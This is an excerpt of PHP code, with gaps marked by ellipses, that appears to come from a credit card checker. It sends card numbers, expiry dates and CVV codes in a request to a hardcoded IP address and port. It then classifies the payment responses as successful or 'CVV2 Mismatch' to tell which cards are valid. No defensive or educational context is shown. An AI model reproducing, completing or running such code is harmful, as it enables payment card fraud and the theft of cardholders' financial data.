...
$requestUrl = "http://206.206.78.217:1120/?cc={$cc}|{$month}|{$year}|{$cvv}";
...
if (stripos($response, '"status":"COMPLETED"') !== false || stripos($response, '\"status\":\"COMPLETED\"') !== false || stripos($response, 'Payment successful') !== false)  {
    ...
    exit;
} elseif (stripos($response, 'CVV2 Mismatch') !== false || (stripos($response, 'Payment Error: 15004') !== false )) {
    $err = 'CVV2 Mismatch';
